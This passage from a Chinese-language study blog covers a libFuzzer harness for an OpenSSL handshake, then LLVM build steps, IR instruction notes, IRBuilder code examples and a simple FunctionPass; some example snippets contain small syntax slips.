int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) &#123;</span><br><span class="line">  static SSL_CTX *sctx = Init();</span><br><span class="line">  SSL *server = SSL_new(sctx);</span><br><span class="line">  BIO *sinbio = BIO_new(BIO_s_mem());</span><br><span class="line">  BIO *soutbio = BIO_new(BIO_s_mem());</span><br><span class="line">  SSL_set_bio(server, sinbio, soutbio);</span><br><span class="line">  SSL_set_accept_state(server);</span><br><span class="line">  BIO_write(sinbio, Data, Size);</span><br><span class="line">  SSL_do_handshake(server);</span><br><span class="line">  SSL_free(server);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>五秒钟？？？</p><p>到底是那点会影响 fuzz 效率呢。。。</p><h2><span id="llvm-pass">llvm PASS</span></h2><p>这一段当成是插入的知识，再看 ASAN 源码过程中意识到编写llvm pass 一定会对以后独自编写 fuzzer 框架有用的，因此今天除了接着研究ASAN源码之余要学习一下llvm pass的编写，目标是熟练掌握 ModulePass 以及 FunctionPass。</p><h3><span id="资料">资料</span></h3><p><a href="http://www.voidcn.com/article/p-mgwevrjr-brn.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-mgwevrjr-brn.html</a><br><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-modulepass-class" target="_blank" rel="noopener">http://llvm.org/docs/WritingAnLLVMPass.html#the-modulepass-class</a><br><a href="https://zhuanlan.zhihu.com/p/26129264" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26129264</a><br><a href="https://blog.csdn.net/Mr_Megamind/article/details/78896717" target="_blank" rel="noopener">https://blog.csdn.net/Mr_Megamind/article/details/78896717</a></p><h3><span id="环境配置">环境配置</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br><span class="line">mkdir LLVM &amp;&amp; cd LLVM</span><br><span class="line">git clone https://github.com/llvm-mirror/llvm.git</span><br><span class="line">cd llvm</span><br><span class="line"></span><br><span class="line">cd tools</span><br><span class="line">git clone https://github.com/llvm-mirror/clang.git</span><br><span class="line">cd ..</span><br><span class="line">mkdir build &amp;&amp; cd build</span><br><span class="line"></span><br><span class="line">cd ~</span><br><span class="line">mkdir KLLVM</span><br><span class="line">cd LLVM/llvm/build</span><br><span class="line">cmake -DLLVM_TARGETS_TO_BUILD=host -DCMAKE_INSTALL_PREFIX=~/KLLVM -DCMAKE_BUILD_TYPE=MinSizeRel -DLLVM_EXPERIMENTAL_TARGETS_TO_BUILD=WebAssembly -DLLVM_INCLUDE_EXAMPLES=OFF -DLLVM_INCLUDE_TESTS=OFF -DCLANG_INCLUDE_TESTS=OFF ..</span><br><span class="line"></span><br><span class="line">cmake --build . --target install -- -j3</span><br></pre></td></tr></table></figure><h3><span id="使用clang">使用clang</span></h3><p>hello.c<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main() &#123;</span><br><span class="line">  printf(&quot;hello worldn&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>complier it<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang hello.c -o hello</span><br></pre></td></tr></table></figure></p><p>输出llvmbitcode<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -O3 -emit-llvm hello.c -c -o hello.bc</span><br></pre></td></tr></table></figure></p><p>-emit-llvm选项可与-S或-c选项一起使用，以分别为代码生成LLVM .ll或.bc文件。两者都是LLVM Bitcode，区别在于前者是可读的文本，后者是不可读的二进制格式。</p><p>使用lli执行.bc<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lli hello.bc</span><br></pre></td></tr></table></figure></p><p>使用llvm-dis对.bc反汇编<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis &lt; hello.bc</span><br></pre></td></tr></table></figure></p><p>使用llc将.bc生成.s<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llc hello.bc -o hello.s</span><br></pre></td></tr></table></figure></p><h4><span id="常用的编译选项">常用的编译选项：</span></h4><ul><li>-c： 只激活预处理,编译,和汇编,也就是他只把程序做成obj文件</li><li>-S： 只激活预处理和编译，就是指把文件编译成为汇编代码。</li><li>-O+num：优化等级</li><li>-emit-llvm：llvmbitcode 可与-c或-S 一同使用，但不能有链接</li></ul><h3><span id="llvm-ir">llvm IR</span></h3><p><a href="https://releases.llvm.org/2.6/docs/tutorial/JITTutorial1.html" target="_blank" rel="noopener">https://releases.llvm.org/2.6/docs/tutorial/JITTutorial1.html</a><br><a href="https://releases.llvm.org/2.6/docs/LangRef.html" target="_blank" rel="noopener">https://releases.llvm.org/2.6/docs/LangRef.html</a></p><p>这块先挖个坑，过年后填回来。</p><p>我来填坑了：</p><h4><span id="identifiers">Identifiers</span></h4><ul><li>全局变量：@</li><li>局部有命名的变量：%+string</li><li>局部未命名的变量：%+num</li><li>注释：；</li><li>如果计算结果未分配给命名值，则会创建未命名的临时值。</li><li>未命名的临时数据按顺序编号</li></ul><h5><span id="high-level-structure">High Level Structure</span></h5><ul><li>Module 是llvm的翻译单元</li><li>每个Module包含functions，全局变量以及符号表</li><li>module可以被llvm-linker操作</li><li>function和全局变量都可以被看作global value</li></ul><h5><span id="指令">指令</span></h5><ul><li><p>ret: </p>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret &lt;type&gt; &lt;value&gt;</span><br></pre></td></tr></table></figure>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ret i32 5                       </span><br><span class="line">ret void                        </span><br><span class="line">ret &#123; i32, i8 &#125; &#123; i32 4, i8 2 &#125; ; Return a struct of values 4 and 2</span><br></pre></td></tr></table></figure></li><li><p>br:  </p>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">br i1 &lt;cond&gt;, label &lt;iftrue&gt;, label &lt;iffalse&gt;</span><br></pre></td></tr></table></figure>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Test:</span><br><span class="line">  %cond = icmp eq i32 %a, %b</span><br><span class="line">  br i1 %cond, label %IfEqual, label %IfUnequal</span><br><span class="line">IfEqual:</span><br><span class="line">  ret i32 1</span><br><span class="line">IfUnequal:</span><br><span class="line">  ret i32 0</span><br></pre></td></tr></table></figure></li><li><p>switch:  </p>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switch &lt;intty&gt; &lt;value&gt;, label &lt;defaultdest&gt; [ &lt;intty&gt; &lt;val&gt;, label &lt;dest&gt; ... ]</span><br></pre></td></tr></table></figure>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; Emulate a conditional br instruction</span><br><span class="line"> %Val = zext i1 %value to i32</span><br><span class="line"> switch i32 %Val, label %truedest [ i32 0, label %falsedest ]</span><br><span class="line"></span><br><span class="line"> ; Emulate an unconditional br instruction</span><br><span class="line"> switch i32 0, label %dest [ ]</span><br><span class="line"></span><br><span class="line"> ; Implement a jump table:</span><br><span class="line"> switch i32 %val, label %otherwise [ i32 0, label %onzero</span><br><span class="line">                                     i32 1, label %onone</span><br><span class="line">                                     i32 2, label %ontwo ]</span><br></pre></td></tr></table></figure></li><li><p>invoke： </p>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = invoke [cconv] [ret attrs] &lt;ptr to function ty&gt; &lt;function ptr val&gt;(&lt;function args&gt;) [fn attrs]</span><br><span class="line">            to label &lt;normal label&gt; unwind label &lt;exception label&gt;</span><br></pre></td></tr></table></figure>  <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  %retval = invoke i32 @Test(i32 15) to label %Continue</span><br><span class="line">            unwind label %TestCleanup              ; &#123;i32&#125;:retval set</span><br><span class="line">%retval = invoke coldcc i32 %Testfnptr(i32 15) to label %Continue</span><br><span class="line">            unwind label %TestCleanup              ; &#123;i32&#125;:retval set</span><br></pre></td></tr></table></figure></li></ul><h3><span id="熟悉-llvm-api-使用">熟悉 LLVM API 使用</span></h3><p>code1：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">using namespace llvm;</span><br><span class="line"></span><br><span class="line">Module* makeLLVMModule() &#123;</span><br><span class="line">  // Module Construction</span><br><span class="line">  Module* mod = new Module(&quot;test&quot;, getGlobalContext());</span><br><span class="line">  Constant* c = mod-&gt;getOrInsertFunction(&quot;mul_add&quot;,</span><br><span class="line">  /*ret type*/                           IntegerType::get(32),</span><br><span class="line">  /*args*/                               IntegerType::get(32),</span><br><span class="line">                                         IntegerType::get(32),</span><br><span class="line">                                         IntegerType::get(32),</span><br><span class="line">  /*varargs terminated with null*/       NULL);</span><br><span class="line">  </span><br><span class="line">  Function* mul_add = cast&lt;Function&gt;(c);</span><br><span class="line">  mul_add-&gt;setCallingConv(CallingConv::C);</span><br><span class="line">  </span><br><span class="line">  Function::arg_iterator args = mul_add-&gt;arg_begin();</span><br><span class="line">  Value* x = args++;</span><br><span class="line">  x-&gt;setName(&quot;x&quot;);</span><br><span class="line">  Value* y = args++;</span><br><span class="line">  y-&gt;setName(&quot;y&quot;);</span><br><span class="line">  Value* z = args++;</span><br><span class="line">  z-&gt;setName(&quot;z&quot;);</span><br><span class="line">  </span><br><span class="line">  BasicBlock* block = BasicBlock::Create(getGlobalContext(), &quot;entry&quot;, mul_add);</span><br><span class="line">  IRBuilder&lt;&gt; builder(block);</span><br><span class="line">  </span><br><span class="line">  Value* tmp = builder.CreateBinOp(Instruction::Mul,</span><br><span class="line">                                   x, y, &quot;tmp&quot;);</span><br><span class="line">  Value* tmp2 = builder.CreateBinOp(Instruction::Add,</span><br><span class="line">                                    tmp, z, &quot;tmp2&quot;);</span><br><span class="line"></span><br><span class="line">  builder.CreateRet(tmp2);</span><br><span class="line">  </span><br><span class="line">  return mod;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char**argv) &#123;</span><br><span class="line">  Module* Mod = makeLLVMModule();</span><br><span class="line"></span><br><span class="line">  verifyModule(*Mod, PrintMessageAction);</span><br><span class="line"></span><br><span class="line">  PassManager PM;</span><br><span class="line">  PM.add(createPrintModulePass(&amp;outs()));</span><br><span class="line">  PM.run(*Mod);</span><br><span class="line"></span><br><span class="line">  delete Mod;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>code2:</p><p><note>:llvm 有自动的名称唯一性<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Module* makeLLVMModule() &#123;</span><br><span class="line">    // constract module</span><br><span class="line">    Module* mod = new Module(&quot;test&quot;, getGlobalContext());</span><br><span class="line">    </span><br><span class="line">    // constract func </span><br><span class="line">    Constant* c = mod-&gt;getOrInsertFunction(&quot;mul_add&quot;,</span><br><span class="line">    /*ret type*/                           IntegerType::get(32),</span><br><span class="line">    /*args*/                               IntegerType::get(32),</span><br><span class="line">                                           IntegerType::get(32),</span><br><span class="line">    /*varargs terminated with null*/       NULL);</span><br><span class="line">    </span><br><span class="line">    // cast this function</span><br><span class="line">    Function* gcd = cast&lt;Function&gt;(c);</span><br><span class="line">    </span><br><span class="line">    //set arg</span><br><span class="line">    Function::arg_iterator args = gcd-&gt;arg_begin();</span><br><span class="line">    Value* x = args++;</span><br><span class="line">    x-&gt;setName(&quot;x&quot;);</span><br><span class="line">    Value* y = args++;</span><br><span class="line">    y-&gt;setName(&quot;y&quot;);</span><br><span class="line">    </span><br><span class="line">    //set basic blocks</span><br><span class="line">    BasicBlock* entry = BasicBlock::Create(getGlobalContext(), (&quot;entry&quot;, gcd);</span><br><span class="line">    BasicBlock* ret = BasicBlock::Create(getGlobalContext(), (&quot;return&quot;, gcd);</span><br><span class="line">    BasicBlock* cond_false = BasicBlock::Create(getGlobalContext(), (&quot;cond_false&quot;, gcd);</span><br><span class="line">    BasicBlock* cond_true = BasicBlock::Create(getGlobalContext(), (&quot;cond_true&quot;, gcd);</span><br><span class="line">    BasicBlock* cond_false_2 = BasicBlock::Create(getGlobalContext(), (&quot;cond_false&quot;, gcd);</span><br><span class="line">    </span><br><span class="line">    //use  IRBuild to fill the &lt;entry&gt; basicblocks</span><br><span class="line">    IRBuilder&lt;&gt; builder(entry);</span><br><span class="line">    </span><br><span class="line">    //fill</span><br><span class="line">    Value* xEqualsY = builder.CreateICmpEQ(x, y, &quot;tmp&quot;);</span><br><span class="line">    builder.CreateCondBr(xEqualsY, ret, cond_false);</span><br><span class="line">    </span><br><span class="line">    //use &lt;SetInsertPoint&gt; to retarget the targetBB</span><br><span class="line">    builder.SetInsertPoint(ret);</span><br><span class="line">    </span><br><span class="line">    //fill</span><br><span class="line">    builder.CreateRet(x);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    builder.SetInsertPoint(cond_true);</span><br><span class="line">    Value* yMinusX = builder.CreateSub(y, x, &quot;tmp&quot;);</span><br><span class="line">    std::vector&lt;Value*&gt; args1;</span><br><span class="line">    args1.push_back(x);</span><br><span class="line">    args1.push_back(yMinusX);</span><br><span class="line">    Value* recur_1 = builder.CreateCall(gcd, args1.begin(), args1.end(), &quot;tmp&quot;);</span><br><span class="line">    builder.CreateRet(recur_1);</span><br><span class="line">    </span><br><span class="line">    builder.SetInsertPoint(cond_false_2);</span><br><span class="line">    Value* xMinusY = builder.CreateSub(x, y, &quot;tmp&quot;);</span><br><span class="line">    std::vector&lt;Value*&gt; args2;</span><br><span class="line">    args2.push_back(xMinusY);</span><br><span class="line">    args2.push_back(y);</span><br><span class="line">    Value* recur_2 = builder.CreateCall(gcd, args2.begin(), args2.end(), &quot;tmp&quot;);</span><br><span class="line">    builder.CreateRet(recur_2);</span><br><span class="line">    </span><br><span class="line">    return mod;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char**argv) &#123;</span><br><span class="line">  Module* Mod = makeLLVMModule();</span><br><span class="line"></span><br><span class="line">  verifyModule(*Mod, PrintMessageAction);</span><br><span class="line"></span><br><span class="line">  PassManager PM;</span><br><span class="line">  PM.add(createPrintModulePass(&amp;outs()));</span><br><span class="line">  PM.run(*Mod);</span><br><span class="line"></span><br><span class="line">  delete Mod;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></note></p><h3><span id="环境配置">环境配置</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br><span class="line">mkdir LLVM &amp;&amp; cd LLVM</span><br><span class="line">git clone https://github.com/llvm-mirror/llvm.git</span><br><span class="line">cd llvm</span><br><span class="line"></span><br><span class="line">cd tools</span><br><span class="line">git clone https://github.com/llvm-mirror/clang.git</span><br><span class="line">cd ..</span><br><span class="line">mkdir build &amp;&amp; cd build</span><br><span class="line"></span><br><span class="line">cd ~</span><br><span class="line">mkdir KLLVM</span><br><span class="line">cd LLVM/llvm/build</span><br><span class="line">cmake -DLLVM_TARGETS_TO_BUILD=host -DCMAKE_INSTALL_PREFIX=~/KLLVM -DCMAKE_BUILD_TYPE=MinSizeRel -DLLVM_EXPERIMENTAL_TARGETS_TO_BUILD=WebAssembly -DLLVM_INCLUDE_EXAMPLES=OFF -DLLVM_INCLUDE_TESTS=OFF -DCLANG_INCLUDE_TESTS=OFF ..</span><br><span class="line"></span><br><span class="line">cmake --build . --target install -- -j3</span><br></pre></td></tr></table></figure><h3><span id="cmakelist">CMakeList</span></h3><p>使用cmake<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;project dir&gt;/</span><br><span class="line">    |</span><br><span class="line">    CMakeLists.txt</span><br><span class="line">    &lt;pass name&gt;/</span><br><span class="line">        |</span><br><span class="line">        CMakeLists.txt</span><br><span class="line">        Pass.cpp</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure></p><p><project dir>/CMakeLists.txt:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">find_package(LLVM REQUIRED CONFIG)</span><br><span class="line"></span><br><span class="line">add_definitions($&#123;LLVM_DEFINITIONS&#125;)</span><br><span class="line">include_directories($&#123;LLVM_INCLUDE_DIRS&#125;)</span><br><span class="line"></span><br><span class="line">add_subdirectory(&lt;pass name&gt;)</span><br></pre></td></tr></table></figure></project></p><p>cmake1:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(NOT DEFINED ENV&#123;LLVM_HOME&#125;)</span><br><span class="line">    message(FATAL_ERROR &quot;$LLVM_HOME is not defined&quot;)</span><br><span class="line">endif()</span><br><span class="line">if(NOT DEFINED ENV&#123;LLVM_DIR&#125;)</span><br><span class="line">    set(ENV&#123;LLVM_DIR&#125; $ENV&#123;LLVM_HOME&#125;/lib/cmake/llvm)</span><br><span class="line">endif()</span><br><span class="line">find_package(LLVM REQUIRED CONFIG)</span><br><span class="line">add_definitions($&#123;LLVM_DEFINITIONS&#125;)</span><br><span class="line">include_directories($&#123;LLVM_INCLUDE_DIRS&#125;)</span><br><span class="line">link_directories($&#123;LLVM_LIBRARY_DIRS&#125;)</span><br><span class="line"> </span><br><span class="line">add_subdirectory(P1umer)  # Use your pass name here.</span><br></pre></td></tr></table></figure></p><p>cmake2:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add_library(P1umerPass MODULE</span><br><span class="line">    # List your source files here.</span><br><span class="line">    P1umer.cpp</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># Use C++11 to compile your pass (i.e., supply -std=c++11).</span><br><span class="line">target_compile_features(P1umerPass PRIVATE cxx_range_for cxx_auto_type)</span><br><span class="line"></span><br><span class="line"># LLVM is (typically) built with no C++ RTTI. We need to match that;</span><br><span class="line"># otherwise, we&apos;ll get linker errors about missing RTTI data.</span><br><span class="line">set_target_properties(P1umerPass PROPERTIES</span><br><span class="line">    COMPILE_FLAGS &quot;-fno-rtti&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h3><span id="编写一个入门的pass示例">编写一个入门的pass示例</span></h3><p><img src="https://p1umer-1256667851.cos.ap-beijing.myqcloud.com/img/20190705002515.png" alt></p><p>p1umer.cpp:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;llvm/Pass.h&quot;</span><br><span class="line">#include &quot;llvm/IR/Function.h&quot;</span><br><span class="line">#include &quot;llvm/Support/raw_ostream.h&quot;</span><br><span class="line">#include &quot;llvm/IR/LegacyPassManager.h&quot;</span><br><span class="line">#include &quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span><br><span class="line">using namespace llvm;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">  struct P1umerPass : public FunctionPass &#123;</span><br><span class="line">    static char ID;</span><br><span class="line">    P1umerPass() : FunctionPass(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    virtual bool doInitialization(Module &amp;) override &#123;</span><br><span class="line"></span><br><span class="line">        printf(&quot;11111111111\n&quot;);</span><br><span class="line">return false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual bool doFinalization(Module &amp;) &#123; </span><br><span class="line">printf(&quot;22222222222\n&quot;);</span><br><span class="line">return false; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual bool runOnFunction(Function &amp;F) &#123;</span><br><span class="line">      errs() &lt;&lt; &quot;I saw a function called &quot; &lt;&lt; F.getName() &lt;&lt; &quot;!\n&quot;;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char P1umerPass::ID = 0;</span><br><span class="line"></span><br><span class="line">// Automatically enable the pass.</span><br><span class="line">// http://adriansampson.net/blog/clangpass.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static RegisterPass&lt;P1umerPass&gt; X(&quot;P1umer&quot;, &quot;Hello P1umer&quot;);</span><br></pre></td></tr></table></figure></p><p>use it:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -c -emit-llvm hello.c -o hello.bc</span><br><span class="line">opt -load ./libP1umerPass.so  -P1umer hello.bc</span><br></pre></td></tr></table></figure></p><p>output:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">11111111111</span><br><span class="line">I saw a function called mul_add!</span><br><span class="line">22222222222</span><br></pre></td></tr></table></figure></p><h3><span id="熟悉依照cfg构建代码">熟悉依照CFG构建代码</span></h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">using namespace llvm;</span><br><span class="line"></span><br><span class="line">Module* makeLLVMModule() &#123;</span><br><span class="line">  // Module Construction</span><br><span class="line">  Module* mod = new Module(&quot;test&quot;, getGlobalContext());</span><br><span class="line">  Constant* c = mod-&gt;getOrInsertFunction(&quot;mul_add&quot;,</span><br><span class="line">  /*ret type*/                           IntegerType::get(32),</span><br><span class="line">  /*args*/                               IntegerType::get(32),</span><br><span class="line">                                         IntegerType::get(32),</span><br><span class="line">                                         IntegerType::get(32),</span><br><span class="line">  /*varargs terminated with null*/       NULL);</span><br><span class="line">  </span><br><span class="line">  Function* mul_add = cast&lt;Function&gt;(c);</span><br><span class="line">  mul_add-&gt;setCallingConv(CallingConv::C);</span><br><span class="line">  </span><br><span class="line">  Function::arg_iterator args = mul_add-&gt;arg_begin();</span><br><span class="line">  Value* x = args++;</span><br><span class="line">  x-&gt;setName(&quot;x&quot;);</span><br><span class="line">  Value* y = args++;</span><br><span class="line">  y-&gt;setName(&quot;y&quot;);</span><br><span class="line">  Value* z = args++;</span><br><span class="line">  z-&gt;setName(&quot;z&quot;);</span><br><span class="line">  </span><br><span class="line">  